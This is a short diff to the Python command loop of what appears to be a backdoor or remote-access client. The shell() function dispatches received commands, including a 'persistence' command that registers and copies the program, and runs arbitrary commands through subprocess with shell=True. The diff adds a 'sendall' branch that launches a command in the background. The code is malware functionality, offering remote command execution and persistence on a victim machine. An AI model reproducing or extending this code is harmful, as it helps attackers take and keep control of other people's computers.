@@ -110,6 +110,9 @@ def shell():
         elif command[:11] == 'persistence':
             reg_name, copy_name = command[12:].split(' ')
             persist(reg_name, copy_name)
+        elif command[:7] == 'sendall':
+            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                             stdin=subprocess.PIPE)
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
